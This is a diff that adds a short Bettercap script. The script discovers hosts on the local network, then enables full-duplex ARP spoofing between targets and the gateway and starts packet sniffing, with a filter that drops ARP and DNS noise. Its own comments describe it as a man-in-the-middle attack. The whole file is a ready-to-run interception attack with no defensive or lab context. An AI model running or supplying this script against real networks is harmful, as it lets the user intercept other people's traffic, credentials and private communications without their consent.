@@ -1,0 +1,18 @@
+# Enable discovery mode to map hosts across the network
+net.probe on
+sleep 2
+net.probe off
+
+# Clear the screen and display the discovered host table / ARP cache
+clear
+net.show
+
+# Enable bidirectional spoofing (Target <-> Bettercap <-> Gateway)
+set arp.spoof.fullduplex true
+
+# BPF Filter: Ignore noise (ARP and DNS traffic) to optimize logging resource/bandwidth
+set net.sniff.filter not arp and not udp port 53 and not udp port 5353
+
+# Execute MitM attack (ARP Poisoning) and initiate packet capture
+arp.spoof on
+net.sniff on
